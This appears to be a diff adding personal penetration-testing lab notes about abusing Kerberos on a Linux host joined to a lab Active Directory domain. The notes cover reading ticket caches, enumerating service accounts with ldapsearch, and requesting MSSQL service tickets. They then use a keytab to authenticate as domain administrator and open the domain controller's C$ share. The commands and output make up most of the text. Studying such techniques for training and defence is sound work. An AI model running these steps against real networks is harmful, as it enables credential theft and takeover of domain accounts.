@@ -1,0 +1,65 @@
+# When user logs in to the server, it asks for ticket from TGS which gets stored locally
+  kali:/ ssh administrator@corp1.com@linuxvictim
+  
+  env | grep KRB5CCNAME
+  KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5
+
+# This tickets gets expired after certain interval, we need to request it again using kinit
+  kinit
+  
+  klist
+  Ticket cache: FILE:/tmp/krb5cc_607000500_wSiMnP
+  Default principal: Administrator@CORP1.COM
+
+# We can now access Kerberos services as the domain administrator. Do not enter any password.
+  ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
+    
+    DC01, Domain Controllers, corp1.com
+  dn: CN=DC01,OU=Domain Controllers,DC=corp1,DC=com
+  servicePrincipalName: TERMSRV/DC01
+  servicePrincipalName: TERMSRV/DC01.corp1.com
+  servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.corp1.com
+  servicePrincipalName: ldap/DC01.corp1.com/ForestDnsZones.corp1.com
+  servicePrincipalName: ldap/DC01.corp1.com/DomainDnsZones.corp1.com
+  servicePrincipalName: DNS/DC01.corp1.com
+  servicePrincipalName: GC/DC01.corp1.com/corp1.com
+  servicePrincipalName: RestrictedKrbHost/DC01.corp1.com
+  servicePrincipalName: RestrictedKrbHost/DC01
+  servicePrincipalName: RPC/8c186ffa-f4e6-4c8a-9ea9-67ca49c31abd._msdcs.corp1.com
+
+  SQLSvc, Corp1ServiceAccounts, Corp1Users, corp1.com
+  dn: CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com
+  servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433
+  servicePrincipalName: MSSQLSvc/DC01.corp1.com:SQLEXPRESS
+  servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:1433
+  servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS
+
+# Let's request a service ticket from Kerberos for the MSSQL using kvno
+  kvno MSSQLSvc/DC01.corp1.com:1433
+  klist
+  07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
+        renew until 08/06/2020 15:11:08
+
+---------------------------------------------------------------------------------------------
+
+# Stealing keytab file
+One way to allow automated scripts to access Kerberos-enabled network resources on a user's behalf is through the use of keytab1 files. 
+These allow a user or script to authenticate to Kerberos resources elsewhere on the network on the principal's behalf without entering a password.
+
+Let's create a sample demonstration keytab for our domain Administrator. (This will write the keytab file to /tmp/administrator.keytab.)
+  ktutil
+  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
+  wkt /tmp/administrator.keytab
+  quit
+
+Root access to this box, we can use it maliciously to gain access to other systems as the domain administrator.
+  kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+  
+Using the klist command, we can verify that the tickets from the keytab have been loaded
+  klist (If tickets are expired, we use )
+  kinit -R
+
+we can authenticate as the domain admin and access any resources they have access to.
+  smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
+
+  ---------------------------------------------------------------------------------------------
